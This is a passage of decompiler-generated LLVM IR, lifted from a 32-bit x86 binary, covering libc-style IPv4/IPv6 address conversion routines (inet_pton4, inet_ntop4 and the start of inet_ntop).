dec_label_pc_804fdb1.preheader:                   ; preds = %dec_label_pc_804fd88
  %v3_804fdb195 = inttoptr i32 %v6_804fd8f to i8*
  %v9_804fdb398 = icmp slt i8* %v3_804fdb195, inttoptr (i32 1 to i8*)
  br i1 %v9_804fdb398, label %dec_label_pc_804fdb9.thread, label %dec_label_pc_804fd9b

dec_label_pc_804fd9b:                             ; preds = %dec_label_pc_804fdb1.preheader, %dec_label_pc_804fd9b
  %v0_804fda9100 = phi i32 [ %v0_804fdb1.pre, %dec_label_pc_804fd9b ], [ 1, %dec_label_pc_804fdb1.preheader ]
  %v0_804fd9b99 = phi i32 [ %v1_804fdb1.pre, %dec_label_pc_804fd9b ], [ %v6_804fd8f, %dec_label_pc_804fdb1.preheader ]
  %v2_804fda1 = sub i32 %v0_804fd9b99, %v0_804fda9100
  %v2_804fda3 = sub i32 %v2_804fc6a, %v0_804fda9100
  %v6_804fda5 = add i32 %v2_804fda1, %v4_804fd81
  store i32 %v6_804fda5, i32* %eax.global-to-local, align 4
  %v1_804fda9 = add i32 %v0_804fda9100, 1
  store i32 %v1_804fda9, i32* @esi, align 4
  %v1_804fdaa = inttoptr i32 %v6_804fda5 to i8*
  %v2_804fdaa = load i8, i8* %v1_804fdaa, align 1
  %v3_804fdaa = zext i8 %v2_804fdaa to i32
  %v4_804fdaa = load i32, i32* @edx, align 4
  %v5_804fdaa = and i32 %v4_804fdaa, -256
  %v6_804fdaa = or i32 %v5_804fdaa, %v3_804fdaa
  store i32 %v6_804fdaa, i32* @edx, align 4
  %v3_804fdac = inttoptr i32 %v2_804fda3 to i8*
  store i8 %v2_804fdaa, i8* %v3_804fdac, align 1
  %v0_804fdae = load i32, i32* %eax.global-to-local, align 4
  %v1_804fdae = inttoptr i32 %v0_804fdae to i8*
  store i8 0, i8* %v1_804fdae, align 1
  %v0_804fdb1.pre = load i32, i32* @esi, align 4
  %v1_804fdb1.pre = load i32, i32* @edi, align 4
  %v2_804fdb1 = inttoptr i32 %v0_804fdb1.pre to i8*
  %v3_804fdb1 = inttoptr i32 %v1_804fdb1.pre to i8*
  %v9_804fdb3 = icmp sgt i8* %v2_804fdb1, %v3_804fdb1
  br i1 %v9_804fdb3, label %dec_label_pc_804fdb9.thread, label %dec_label_pc_804fd9b

dec_label_pc_804fdb9.thread:                      ; preds = %dec_label_pc_804fd9b, %dec_label_pc_804fdb1.preheader
  br label %dec_label_pc_804fdbf

dec_label_pc_804fdb9:                             ; preds = %dec_label_pc_804fd81
  %v16_804fdb9 = icmp eq i32 %v0_804fdb9.pre, %v2_804fc6a
  %v1_804fdbd = icmp eq i1 %v16_804fdb9, false
  br i1 %v1_804fdbd, label %dec_label_pc_804fdea, label %dec_label_pc_804fdbf

dec_label_pc_804fdbf:                             ; preds = %dec_label_pc_804fdb9.thread, %dec_label_pc_804fdb9
  store i32 %v2_804fc5e, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_804fdcb = call i32 @memcpy(i16* %tmp64, i32 %v2_804fc5e, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fdec

dec_label_pc_804fdda:                             ; preds = %dec_label_pc_804fc3e
  %v1_804fdda = call i32 @__errno_location(i32 %v0_804fc2d)
  %v1_804fddf = inttoptr i32 %v1_804fdda to i32*
  store i32 97, i32* %v1_804fddf, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fdec

dec_label_pc_804fdea:                             ; preds = %dec_label_pc_804fceb, %dec_label_pc_804fce2, %dec_label_pc_804fca6, %dec_label_pc_804fccd, %dec_label_pc_804fd88, %dec_label_pc_804fd2c, %dec_label_pc_804fdb9, %dec_label_pc_804fd6a, %dec_label_pc_804fd1f, %dec_label_pc_804fd16, %dec_label_pc_804fc79
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fdec

dec_label_pc_804fdec:                             ; preds = %dec_label_pc_804fdda, %dec_label_pc_804fdbf, %dec_label_pc_804fc49, %dec_label_pc_804fdea
  %v0_804fdf3 = phi i32 [ -1, %dec_label_pc_804fdda ], [ 1, %dec_label_pc_804fdbf ], [ %v3_804fc4f, %dec_label_pc_804fc49 ], [ 0, %dec_label_pc_804fdea ]
  store i32 %v0_804fc2d, i32* @ebx, align 4
  store i32 %v0_804fc2c, i32* @esi, align 4
  store i32 %v0_804fc2b, i32* @edi, align 4
  store i32 %v0_804fc2a, i32* @ebp, align 4
  ret i32 %v0_804fdf3

; uselistorder directives
  uselistorder i32 %v1_804fdb1.pre, { 1, 0 }
  uselistorder i32 %v0_804fdb1.pre, { 1, 0 }
  uselistorder i32 %v0_804fda9100, { 2, 1, 0 }
  uselistorder i32 %v0_804fdb9.pre, { 2, 1, 0 }
  uselistorder i32 %v0_804fdb9.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_804fd51, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_804fc9e, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_804fc6a, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804fc2d, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804fdec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804fdea, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_804fdbf, { 1, 0 }
  uselistorder label %dec_label_pc_804fd9b, { 1, 0 }
  uselistorder label %dec_label_pc_804fd81, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fd4a, { 1, 0 }
  uselistorder label %dec_label_pc_804fd0a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fd4a.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_804fdf5 = load i32, i32* @edi, align 4
  %v0_804fdf6 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_804fdfe = load i32, i32* @eax, align 4
  %v3_804fe02 = and i32 %v0_804fdfe, -65536
  store i32 %v3_804fe02, i32* %stack_var_-33, align 4
  %v2_804fe0d = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804fe13 = load i32, i32* @edx, align 4
  %v5_804fe13 = inttoptr i32 %v0_804fe13 to i8*
  store i8* %v5_804fe13, i8** %stack_var_-60, align 4
  %v0_804fe17 = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_804fe1d = add i32 %v2_804fe0d, 4
  store i32 %v6_804fe1d, i32* %edi.global-to-local, align 4
  %v2_804fe1e = inttoptr i32 %v6_804fe1d to i32*
  store i32 0, i32* %v2_804fe1e, align 4
  %v3_804fe1e = load i32, i32* %edi.global-to-local, align 4
  %v6_804fe1e = add i32 %v3_804fe1e, 4
  store i32 %v6_804fe1e, i32* %edi.global-to-local, align 4
  %v0_804fe1f = load i32, i32* %eax.global-to-local, align 4
  %v2_804fe1f = inttoptr i32 %v6_804fe1e to i32*
  store i32 %v0_804fe1f, i32* %v2_804fe1f, align 4
  %v3_804fe1f = load i32, i32* %edi.global-to-local, align 4
  %v6_804fe1f = add i32 %v3_804fe1f, 4
  store i32 %v6_804fe1f, i32* %edi.global-to-local, align 4
  %v0_804fe20 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fe20 = trunc i32 %v0_804fe20 to i16
  %v3_804fe20 = inttoptr i32 %v6_804fe1f to i16*
  store i16 %v1_804fe20, i16* %v3_804fe20, align 2
  %v4_804fe20 = load i32, i32* %edi.global-to-local, align 4
  %v7_804fe20 = add i32 %v4_804fe20, 2
  store i32 %v7_804fe20, i32* %edi.global-to-local, align 4
  %v0_804fe22 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fe22 = trunc i32 %v0_804fe22 to i8
  %v3_804fe22 = inttoptr i32 %v7_804fe20 to i8*
  store i8 %v1_804fe22, i8* %v3_804fe22, align 1
  %v0_804feb226 = load i32, i32* %ebp.global-to-local, align 4
  %v7_804feb529 = icmp sgt i32 %v0_804feb226, 3
  br i1 %v7_804feb529, label %dec_label_pc_804febb, label %dec_label_pc_804fe28

dec_label_pc_804fe28:                             ; preds = %entry, %dec_label_pc_804fe90
  %v0_804feb230 = phi i32 [ %v0_804feb2, %dec_label_pc_804fe90 ], [ %v0_804feb226, %entry ]
  %v0_804fe2c = load i32, i32* @ecx, align 4
  %v1_804fe2c = and i32 %v0_804fe2c, -256
  %v2_804fe2c = or i32 %v1_804fe2c, 100
  store i32 %v2_804fe2c, i32* %ecx.global-to-local, align 4
  %v2_804fe2e = add i32 %v0_804feb230, %v0_804fdfe
  store i32 %v2_804fe2e, i32* %eax.global-to-local, align 4
  %v0_804fe30 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fe30 = add i32 %v0_804fe30, 1
  store i32 %v1_804fe30, i32* @esi, align 4
  store i32 %v0_804fe30, i32* @edi, align 4
  %v1_804fe39 = inttoptr i32 %v2_804fe2e to i8*
  %v2_804fe39 = load i8, i8* %v1_804fe39, align 1
  %v3_804fe39 = zext i8 %v2_804fe39 to i32
  %v4_804fe39 = load i32, i32* @edx, align 4
  %v5_804fe39 = and i32 %v4_804fe39, -65536
  %v6_804fe39 = or i32 %v5_804fe39, %v3_804fe39
  store i32 %v6_804fe39, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_804fe39, 100
  %v6_804fe3f = zext i8 %div to i32
  %v4_804fe41 = or i32 %v6_804fe3f, %v1_804fe2c
  store i32 %v4_804fe41, i32* %ecx.global-to-local, align 4
  %v1_804fe43 = or i32 %v4_804fe41, 48
  store i32 %v1_804fe43, i32* %eax.global-to-local, align 4
  %v1_804fe46 = trunc i32 %v1_804fe43 to i8
  %v2_804fe46 = load i32, i32* @esp, align 4
  %v4_804fe46 = add i32 %v0_804fe30, 43
  %v5_804fe46 = add i32 %v4_804fe46, %v2_804fe46
  %v6_804fe46 = inttoptr i32 %v5_804fe46 to i8*
  store i8 %v1_804fe46, i8* %v6_804fe46, align 1
  %v0_804fe4a = load i32, i32* %eax.global-to-local, align 4
  %v1_804fe4a = trunc i32 %v0_804fe4a to i8
  %v7_804fe4a = icmp eq i8 %v1_804fe4a, 48
  %v1_804fe4c = icmp eq i1 %v7_804fe4a, false
  %v0_804fe72 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fe72 = and i32 %v0_804fe72, -256
  %v2_804fe72 = or i32 %v1_804fe72, 10
  store i32 %v2_804fe72, i32* %ecx.global-to-local, align 4
  %v0_804fe74 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804fe74, i32* %eax.global-to-local, align 4
  %v3_804fe76 = trunc i32 %v0_804fe74 to i16
  %v5_804fe76 = udiv i16 %v3_804fe76, 10
  br i1 %v1_804fe4c, label %dec_label_pc_804fe72, label %dec_label_pc_804fe4e

dec_label_pc_804fe4e:                             ; preds = %dec_label_pc_804fe28
  %v9_804fe52 = and i32 %v0_804fe74, -65536
  %tmp = urem i16 %v5_804fe76, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div32 = udiv i16 %tmp, 10
  %v7_804fe5f = zext i16 %div32 to i32
  %v11_804fe5f = or i32 %v7_804fe5f, %v9_804fe52
  store i32 %v11_804fe5f, i32* %eax.global-to-local, align 4
  %tmp34 = urem i16 %tmp, 10
  %v12_804fe5f = zext i16 %tmp34 to i32
  %v1_804fe62 = or i32 %v12_804fe5f, 48
  %v8_804fe62 = trunc i32 %v1_804fe62 to i8
  store i32 %v1_804fe62, i32* %edx.global-to-local, align 4
  %v2_804fe65 = load i32, i32* @esp, align 4
  %v3_804fe65 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804fe65 = add i32 %v2_804fe65, 43
  %v5_804fe65 = add i32 %v4_804fe65, %v3_804fe65
  %v6_804fe65 = inttoptr i32 %v5_804fe65 to i8*
  store i8 %v8_804fe62, i8* %v6_804fe65, align 1
  %v0_804fe69 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fe69 = trunc i32 %v0_804fe69 to i8
  %v7_804fe69 = icmp eq i8 %v1_804fe69, 48
  br i1 %v7_804fe69, label %dec_label_pc_804fe90, label %dec_label_pc_804fe6e

dec_label_pc_804fe6e:                             ; preds = %dec_label_pc_804fe4e
  %v0_804fe6e = load i32, i32* @esi, align 4
  store i32 %v0_804fe6e, i32* @edi, align 4
  br label %dec_label_pc_804fe90

dec_label_pc_804fe72:                             ; preds = %dec_label_pc_804fe28
  %tmp35 = urem i16 %v5_804fe76, 256
  %v3_804fe78 = and i32 %v0_804fe74, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div33 = udiv i16 %tmp35, 10
  %v7_804fe83 = zext i16 %div33 to i32
  %v11_804fe83 = or i32 %v7_804fe83, %v3_804fe78
  store i32 %v11_804fe83, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp35, 10
  %v12_804fe83 = zext i16 %tmp36 to i32
  %v1_804fe86 = or i32 %v12_804fe83, 48
  %v8_804fe86 = trunc i32 %v1_804fe86 to i8
  store i32 %v1_804fe86, i32* %edx.global-to-local, align 4
  %v0_804fe89 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fe89 = add i32 %v0_804fe89, 2
  store i32 %v1_804fe89, i32* @edi, align 4
  %v2_804fe8c = load i32, i32* @esp, align 4
  %v3_804fe8c = load i32, i32* @esi, align 4
  %v4_804fe8c = add i32 %v2_804fe8c, 43
  %v5_804fe8c = add i32 %v4_804fe8c, %v3_804fe8c
  %v6_804fe8c = inttoptr i32 %v5_804fe8c to i8*
  store i8 %v8_804fe86, i8* %v6_804fe8c, align 1
  br label %dec_label_pc_804fe90

dec_label_pc_804fe90:                             ; preds = %dec_label_pc_804fe4e, %dec_label_pc_804fe6e, %dec_label_pc_804fe72
  store i32 %v2_804fe2e, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_804fe99 = load i32, i32* @edi, align 4
  %v1_804fe99 = add i32 %v0_804fe99, 2
  store i32 %v1_804fe99, i32* %ebx.global-to-local, align 4
  %v0_804fe9c = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fe9c = add i32 %v0_804fe9c, 1
  store i32 %v1_804fe9c, i32* %ebp.global-to-local, align 4
  %v2_804fe9d = load i8, i8* %v1_804fe39, align 1
  %v3_804fe9d = zext i8 %v2_804fe9d to i32
  %v4_804fe9d = load i32, i32* %eax.global-to-local, align 4
  %v5_804fe9d = and i32 %v4_804fe9d, -65536
  %v6_804fe9d = or i32 %v5_804fe9d, %v3_804fe9d
  store i32 %v6_804fe9d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804fea3 = load i32, i32* @esp, align 4
  %v2_804fea3 = add i32 %v0_804fe99, 44
  %v3_804fea3 = add i32 %v2_804fea3, %v0_804fea3
  %v4_804fea3 = inttoptr i32 %v3_804fea3 to i8*
  store i8 46, i8* %v4_804fea3, align 1
  %v0_804fea8 = load i32, i32* @ecx, align 4
  %v1_804fea8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fea8 = urem i32 %v1_804fea8, 65536
  %v3_804fea8 = load i32, i32* %edx.global-to-local, align 4
  %v4_804fea8 = mul i32 %v3_804fea8, 65536
  %v5_804fea8 = or i32 %v4_804fea8, %v2_804fea8
  %v6_804fea8 = urem i32 %v0_804fea8, 65536
  %v7_804fea8 = udiv i32 %v5_804fea8, %v6_804fea8
  %v8_804fea8 = urem i32 %v7_804fea8, 65536
  %v10_804fea8 = and i32 %v1_804fea8, -65536
  %v11_804fea8 = or i32 %v8_804fea8, %v10_804fea8
  store i32 %v11_804fea8, i32* %eax.global-to-local, align 4
  %v12_804fea8 = urem i32 %v5_804fea8, %v6_804fea8
  %v14_804fea8 = and i32 %v3_804fea8, -65536
  %v15_804fea8 = or i32 %v12_804fea8, %v14_804fea8
  %v1_804feab = add i32 %v15_804fea8, 48
  %v8_804feab = trunc i32 %v1_804feab to i8
  store i32 %v1_804feab, i32* @edx, align 4
  %v2_804feae = load i32, i32* @esp, align 4
  %v3_804feae = load i32, i32* @edi, align 4
  %v4_804feae = add i32 %v2_804feae, 43
  %v5_804feae = add i32 %v4_804feae, %v3_804feae
  %v6_804feae = inttoptr i32 %v5_804feae to i8*
  store i8 %v8_804feab, i8* %v6_804feae, align 1
  %v0_804feb2 = load i32, i32* %ebp.global-to-local, align 4
  %v7_804feb5 = icmp sgt i32 %v0_804feb2, 3
  br i1 %v7_804feb5, label %dec_label_pc_804febb, label %dec_label_pc_804fe28

dec_label_pc_804febb:                             ; preds = %dec_label_pc_804fe90, %entry
  %v0_804febb = load i32, i32* @esp, align 4
  %v1_804febb = load i32, i32* %ebx.global-to-local, align 4
  %v2_804febb = add i32 %v0_804febb, 42
  %v3_804febb = add i32 %v2_804febb, %v1_804febb
  %v4_804febb = inttoptr i32 %v3_804febb to i8*
  store i8 0, i8* %v4_804febb, align 1
  %v2_804fec3 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_804fec3, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_804fec8 = call i32 @strlen(i8* %tmp23)
  store i32 %v3_804fec8, i32* @eax, align 4
  %tmp31 = icmp ugt i32 %v3_804fec8, %v0_804fe17
  br i1 %tmp31, label %dec_label_pc_804fed6, label %dec_label_pc_804fee5

dec_label_pc_804fed6:                             ; preds = %dec_label_pc_804febb
  %v0_804fed6 = load i8*, i8** %stack_var_-92, align 4
  %v1_804fed6 = ptrtoint i8* %v0_804fed6 to i32
  %v2_804fed6 = call i32 @__errno_location(i32 %v1_804fed6)
  %v1_804fedb = inttoptr i32 %v2_804fed6 to i32*
  store i32 28, i32* %v1_804fedb, align 4
  br label %dec_label_pc_804fef4

dec_label_pc_804fee5:                             ; preds = %dec_label_pc_804febb
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_804fee85 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_804fee85, i32* %tmp25, align 4
  %v0_804feec.cast = inttoptr i32 %v3_804fee85 to i8*
  %v4_804feec = call i32 @strcpy(i8* %v0_804feec.cast, i32 %v2_804fec3)
  br label %dec_label_pc_804fef4

dec_label_pc_804fef4:                             ; preds = %dec_label_pc_804fed6, %dec_label_pc_804fee5
  %storemerge = phi i32 [ %v4_804feec, %dec_label_pc_804fee5 ], [ 0, %dec_label_pc_804fed6 ]
  %v0_804fefb = phi i32 [ %v4_804feec, %dec_label_pc_804fee5 ], [ 0, %dec_label_pc_804fed6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804fdf6, i32* @esi, align 4
  store i32 %v0_804fdf5, i32* @edi, align 4
  ret i32 %v0_804fefb

; uselistorder directives
  uselistorder i32 %v0_804feb2, { 1, 0 }
  uselistorder i32 %v3_804fea8, { 1, 0 }
  uselistorder i32 %v1_804fea8, { 1, 0 }
  uselistorder i32 %v1_804fe86, { 1, 0 }
  uselistorder i32 %v1_804fe62, { 1, 0 }
  uselistorder i32 %v0_804fe74, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804fe43, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 0, 1, 8, 9, 2, 3, 4, 7, 6, 5 }
  uselistorder i32 43, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 100, { 4, 0, 2, 3, 1 }
  uselistorder i32 -65536, { 2, 3, 4, 1, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_804fef4, { 1, 0 }
  uselistorder label %dec_label_pc_804fe90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fe28, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_804fefd = load i32, i32* @edi, align 4
  %v0_804fefe = load i32, i32* @esi, align 4
  %v0_804feff = load i32, i32* @ebx, align 4
  %v15_804ff00 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_804ff07 = icmp eq i32 %arg1, 2
  br i1 %v9_804ff07, label %dec_label_pc_804ff17, label %dec_label_pc_804ff0c

dec_label_pc_804ff0c:                             ; preds = %entry
  %v9_804ff0c = icmp eq i32 %arg1, 10
  %v1_804ff0f = icmp eq i1 %v9_804ff0c, false
  br i1 %v1_804ff0f, label %dec_label_pc_80500b3, label %dec_label_pc_804ff2f

dec_label_pc_804ff17:                             ; preds = %entry
  %v4_804ff17 = ptrtoint i8* %arg3 to i32
  store i32 %v4_804ff17, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_804ff23 = call i32 @inet_ntop4(i32 %v0_804feff, i32 %v0_804fefe, i32 %v0_804fefd)
  store i32 %v3_804ff23, i32* %eax.global-to-local, align 4
  store i32 %v3_804ff23, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80500c0

dec_label_pc_804ff2f:                             ; preds = %dec_label_pc_804ff0c
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_804ff34 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804ff34, i32* %eax.global-to-local, align 4
  %tmp44 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp44, i8** %stack_var_-124, align 4
  %v6_804ff39 = call i32 @__GI_memset(i8* %tmp44, i32 0, i32 32)
  store i32 %v6_804ff39, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_804ff5b = add i32 %arg2, 1
  br label %dec_label_pc_804ff45

dec_label_pc_804ff45:                             ; preds = %dec_label_pc_804ff45.dec_label_pc_804ff45_crit_edge, %dec_label_pc_804ff2f
  %v1_804ff68 = phi i32 [ %v15_804ff00, %dec_label_pc_804ff2f ], [ %v1_804ff68.pre, %dec_label_pc_804ff45.dec_label_pc_804ff45_crit_edge ]
  %v0_804ff6373 = phi i32 [ 0, %dec_label_pc_804ff2f ], [ %v0_804ff6c.pre, %dec_label_pc_804ff45.dec_label_pc_804ff45_crit_edge ]
  %v1_804ff4e = ashr i32 %v0_804ff6373, 31
  %v2_804ff4f = zext i32 %v0_804ff6373 to i64
  %v4_804ff4f = zext i32 %v1_804ff4e to i64
  %v5_804ff4f = mul nuw i64 %v4_804ff4f, 4294967296
  %v6_804ff4f = or i64 %v5_804ff4f, %v2_804ff4f
  %v8_804ff4f = sdiv i64 %v6_804ff4f, 2
  %v9_804ff4f = trunc i64 %v8_804ff4f to i32
  store i32 %v9_804ff4f, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_804ff4f, i32* %ebx.global-to-local, align 4
  %v2_804ff57 = add i32 %v0_804ff6373, %arg2
  %v3_804ff57 = inttoptr i32 %v2_804ff57 to i8*
  %v4_804ff57 = load i8, i8* %v3_804ff57, align 1
  %v5_804ff57 = zext i8 %v4_804ff57 to i32
  store i32 %v5_804ff57, i32* %eax.global-to-local, align 4
  %v3_804ff5b = add i32 %v2_804ff5b, %v0_804ff6373
  %v4_804ff5b = inttoptr i32 %v3_804ff5b to i8*
  %v5_804ff5b = load i8, i8* %v4_804ff5b, align 1
  %v6_804ff5b = zext i8 %v5_804ff5b to i32
  store i32 %v6_804ff5b, i32* %edx.global-to-local, align 4
  %v2_804ff60 = mul nuw nsw i32 %v5_804ff57, 256
  %v1_804ff63 = add i32 %v0_804ff6373, 2
  store i32 %v1_804ff63, i32* %ecx.global-to-local, align 4
  %v2_804ff66 = or i32 %v6_804ff5b, %v2_804ff60
  store i32 %v2_804ff66, i32* %eax.global-to-local, align 4
  %v3_804ff68 = mul i32 %v9_804ff4f, 4
  %v4_804ff68 = add i32 %v3_804ff68, 60
  %v5_804ff68 = add i32 %v4_804ff68, %v1_804ff68
  %v6_804ff68 = inttoptr i32 %v5_804ff68 to i32*
  store i32 %v2_804ff66, i32* %v6_804ff68, align 4
  %v0_804ff6c.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_804ff6f = icmp sgt i32 %v0_804ff6c.pre, 15
  br i1 %v7_804ff6f, label %dec_label_pc_804ff71, label %dec_label_pc_804ff45.dec_label_pc_804ff45_crit_edge

dec_label_pc_804ff45.dec_label_pc_804ff45_crit_edge: ; preds = %dec_label_pc_804ff45
  %v1_804ff68.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ff45

dec_label_pc_804ff71:                             ; preds = %dec_label_pc_804ff45
  %v4_804ff2f = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804ff7b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ff7b

dec_label_pc_804ff7b:                             ; preds = %dec_label_pc_804ff71, %dec_label_pc_804ffa8
  %v0_804ffa872 = phi i32 [ 0, %dec_label_pc_804ff71 ], [ %v1_804ffa8, %dec_label_pc_804ffa8 ]
  %v0_804ff9371 = phi i32 [ -1, %dec_label_pc_804ff71 ], [ %v0_804ff939, %dec_label_pc_804ffa8 ]
  %v0_804ffb370 = phi i32 [ -1, %dec_label_pc_804ff71 ], [ %v0_804ff9810, %dec_label_pc_804ffa8 ]
  %v0_804ffbe69 = phi i32 [ -1, %dec_label_pc_804ff71 ], [ %v0_804ffa314, %dec_label_pc_804ffa8 ]
  %v2_804ff7b = mul nuw nsw i32 %v0_804ffa872, 4
  %v3_804ff7b = add nuw nsw i32 %v2_804ff7b, 60
  %v4_804ff7b = add i32 %v3_804ff7b, %v0_804ff7b.pre
  %v5_804ff7b = inttoptr i32 %v4_804ff7b to i32*
  %v6_804ff7b = load i32, i32* %v5_804ff7b, align 4
  %v7_804ff7b = icmp eq i32 %v6_804ff7b, 0
  %v1_804ff80 = icmp eq i1 %v7_804ff7b, false
  %v10_804ff93 = icmp eq i32 %v0_804ff9371, -1
  br i1 %v1_804ff80, label %dec_label_pc_804ff93, label %dec_label_pc_804ff82

dec_label_pc_804ff82:                             ; preds = %dec_label_pc_804ff7b
  %v1_804ff85 = icmp eq i1 %v10_804ff93, false
  br i1 %v1_804ff85, label %dec_label_pc_804ff90, label %dec_label_pc_804ff87

dec_label_pc_804ff87:                             ; preds = %dec_label_pc_804ff82
  store i32 %v0_804ffa872, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ffa8

dec_label_pc_804ff90:                             ; preds = %dec_label_pc_804ff82
  %v0_804ff90 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ff90 = add i32 %v0_804ff90, 1
  store i32 %v1_804ff90, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ffa8

dec_label_pc_804ff93:                             ; preds = %dec_label_pc_804ff7b
  br i1 %v10_804ff93, label %dec_label_pc_804ffa8, label %dec_label_pc_804ff98

dec_label_pc_804ff98:                             ; preds = %dec_label_pc_804ff93
  %v10_804ff98 = icmp eq i32 %v0_804ffb370, -1
  %v0_804ffa1.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ff9d = load i32, i32* @ebp, align 4
  %v7_804ff9f = icmp sgt i32 %v0_804ffa1.pre, %v1_804ff9d
  %or.cond = or i1 %v10_804ff98, %v7_804ff9f
  br i1 %or.cond, label %dec_label_pc_804ffa1, label %dec_label_pc_804ffa5

dec_label_pc_804ffa1:                             ; preds = %dec_label_pc_804ff98
